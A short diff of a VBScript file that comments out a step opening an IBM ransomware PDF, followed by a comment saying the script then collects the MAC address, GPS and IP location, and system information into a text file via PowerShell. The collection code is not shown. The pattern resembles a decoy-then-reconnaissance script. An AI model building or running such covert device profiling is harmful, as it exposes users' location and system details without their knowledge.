@@ -4,9 +4,9 @@ Dim objShell
 Set objShell = CreateObject("WScript.Shell")
 
 ' Open the IBM ransomware PDF
-objShell.Run "https://www.ibm.com/support/pages/system/files/inline-files/Ransomware%20and%20IBM%20i.pdf"
+' objShell.Run "https://www.ibm.com/support/pages/system/files/inline-files/Ransomware%20and%20IBM%20i.pdf"
 ' Wait for 1 second
-WScript.Sleep 1000
+' WScript.Sleep 1000
 
 ' Extract MAC address, GPS location, IP-based location, system information, and save to a text file
 ' Run PowerShell command
